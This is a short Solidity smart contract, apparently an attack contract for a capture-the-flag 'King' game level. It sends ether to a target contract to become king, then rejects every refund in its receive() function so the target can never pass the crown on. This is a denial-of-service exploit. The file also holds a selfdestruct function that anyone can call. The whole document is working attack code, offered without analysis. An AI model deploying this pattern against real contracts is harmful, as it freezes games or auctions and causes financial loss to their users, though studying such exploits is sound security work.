// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingForever {
    address owner;
    uint256 value;

    constructor() public payable {
        owner = msg.sender;
        value = msg.value;
    }

    function overthrowKing(address payable _address) public payable {
        (bool call_tx, bytes memory data) = _address.call{value: value}("");

        require(call_tx, "Error sending ETH");
    }

    //? Stop the contract from receiving any ether
    receive() external payable {
        revert("Aaaahahaaa You didn't say the magic word");
    }

    //? Send back the ether from the contract to us
    //? in this case can't destory the contract
    function destruction() public {
        selfdestruct(payable(owner));
    }
}
